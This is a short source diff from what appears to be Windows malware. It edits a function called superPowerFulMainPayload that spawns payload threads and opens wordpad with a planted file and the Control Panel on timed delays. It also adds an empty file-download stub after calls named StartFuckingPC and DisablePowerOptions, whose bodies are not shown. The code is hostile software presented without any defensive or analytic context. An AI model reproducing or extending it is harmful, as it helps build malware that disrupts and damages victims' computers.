@@ -1127,7 +1127,7 @@ void superPowerFulMainPayload() {
     Sleep(1500);
     CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
     Sleep(4500);
-    ShellExecuteA(NULL, NULL, "wordpad", "\u0022C:\\Program Files\\Common Files\\system\\paint.rtf\u0022", NULL, SW_SHOWDEFAULT);
+    ShellExecuteA(NULL, NULL, "wordpad", "\u0022C:\\Program Files\\Common Files\\system\\paynt.rtf\u0022", NULL, SW_SHOWDEFAULT);
     Sleep(8500);
     ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
     Sleep(7900);
@@ -1205,4 +1205,9 @@ void UnknownHradError() {
 
     StartFuckingPC();
     DisablePowerOptions();
+    ExitProcess(0);
+}
+
+void DownlaodFiles() {
+
 }
